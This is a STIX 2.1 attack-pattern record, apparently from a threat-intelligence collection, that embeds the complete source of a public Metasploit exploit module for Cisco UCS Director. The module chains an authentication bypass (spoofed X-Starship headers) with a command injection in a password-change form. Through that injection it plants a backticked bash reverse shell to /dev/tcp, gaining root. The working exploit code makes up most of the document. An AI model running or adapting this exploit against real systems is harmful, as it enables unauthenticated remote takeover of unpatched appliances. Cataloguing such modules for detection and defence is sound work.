{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2e59bbd-9e06-4d1b-8c8c-825a9f175372",
    "created": "2024-08-14T17:04:14.72909Z",
    "modified": "2024-08-14T17:04:14.729094Z",
    "name": "Cisco UCS Director Unauthenticated Remote Code Execution",
    "description": " The Cisco UCS Director virtual appliance contains two flaws that can be combined and abused by an attacker to achieve remote code execution as root.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_ucs_rce.rb",
            "external_id": "cisco_ucs_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-cmdinj"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Aug/36"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-ucs-rce.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco UCS Director Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n        The Cisco UCS Director virtual appliance contains two flaws that can be combined\n        and abused by an attacker to achieve remote code execution as root.\n        The first one, CVE-2019-1937, is an authentication bypass, that allows the\n        attacker to authenticate as an administrator.\n        The second one, CVE-2019-1936, is a command injection in a password change form,\n        that allows the attacker to inject commands that will execute as root.\n        This module combines both vulnerabilities to achieve the unauthenticated command\n        injection as root.\n        It has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.\n        Note that Cisco also mentions in their advisory that their IMC Supervisor and\n        UCS Director Express are also affected by these vulnerabilities, but this module\n        was not tested with those products.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2019-1937' ], # auth bypass\n          [ 'CVE', '2019-1936' ], # command injection\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-cmdinj' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Aug/36' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-ucs-rce.txt' ]\n        ],\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'DefaultOptions' =>\n        {\n          'payload' => 'cmd/unix/reverse_bash',\n        },\n      'Targets'        =>\n        [\n          [ 'Cisco UCS Director < 6.7.2.0', {} ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2019-08-21'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Connect with TLS', true]),\n        OptString.new('TARGETURI', [true,  \"Default server path\", '/']),\n      ])\n  end\n\n  def check\n    # can't think of anything better then this\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, 'app', 'ui', 'login'),\n      'method' => 'GET'\n    })\n    if res and res.code == 302\n        return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    # step 1: get a JSESSIONID cookie\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'app', 'ui', 'login'),\n      'method' => 'GET'\n    )\n\n    if res and (res.code == 200 or res.code == 302)\n      jsession = res.get_cookies.split(';')[0]\n\n      # step 2: authenticate our cookie as admin\n      res = send_request_cgi({\n        'uri'       => normalize_uri(target_uri.path, 'app', 'ui', 'ClientServlet'),\n        'cookie'    => jsession,\n        'vars_get'  =>\n          {\n            'apiName'     => 'GetUserInfo'\n          },\n        'headers'   =>\n          {\n            # X-Requested-With and Referer headers are needed, else the server ignores us\n            # The X-Starship headers are the key to this auth bypass vuln, see the References\n            'X-Requested-With'            => 'XMLHttpRequest',\n            'Referer'                     => \"https://#{rhost}#{rport == 443 ? \"\" : \":\" + rport}/\",\n            'X-Starship-UserSession-Key'  => \"#{rand_text_alpha(5..12)}\",\n            'X-Starship-Request-Key'      => \"#{rand_text_alpha(5..12)}\"\n          },\n        'method' => 'GET'\n      })\n\n      if res and res.code == 200 and res.body.include?(\"admin\")\n        if not res.get_cookies.empty?\n          # if the server returns a new cookie, use that\n          jsession = res.get_cookies.split(';')[0]\n        end\n        print_good(\"#{peer} - Successfully bypassed auth and got our admin JSESSIONID cookie!\")\n\n        # step 3: request our reverse shell\n        payload = %{{\"param0\":\"admin\",\"param1\":{\"ids\":null,\"targetCuicId\":null,\"uiMenuTag\":23,\"cloudName\":null,\"filterId\":null,\"id\":null,\"type\":10},\"param2\":\"scpUserConfig\",\"param3\":[{\"fieldId\":\"FIELD_ID_USERNAME\",\"value\":\"scpuser\"},{\"fieldId\":\"FIELD_ID_DESCRIPTION\",\"value\":\"The 'scpuser' will be configured on this appliance in order to enable file transfer operations via the 'scp' command. This user account cannot be used to login to the GUI or shelladmin.\"},{\"fieldId\":\"FIELD_ID_PASSWORD\",\"value\":\"`bash -i >& /dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1 &``\"}]}}\n\n        res = send_request_cgi({\n          'uri'       => normalize_uri(target_uri.path, 'app', 'ui', 'ClientServlet'),\n          'cookie'    => jsession,\n          'headers'   =>\n            {\n              # X-Requested-With and Referer headers are needed, else the server ignores us\n              # The X-Starship headers are the key to this auth bypass vuln, see the References\n              'X-Requested-With'            => 'XMLHttpRequest',\n              'Referer'                     => \"https://#{rhost}#{rport == 443 ? \"\" : \":\" + rport}/\",\n            },\n          'method' => 'POST',\n          'vars_post' =>\n            {\n              'formatType'  => 'json',\n              'apiName'     => 'ExecuteGenericOp',\n              'serviceName' => 'InfraMgr',\n              'opName'      => 'doFormSubmit',\n              'opData'      => payload\n            }\n        })\n        if res and res.code == 200\n          print_good(\"#{peer} - Shelly is here, press ENTER to start playing with her!\")\n        end\n      else\n        fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate JSESSIONID cookie\")\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain JSESSIONID cookie\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-08-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}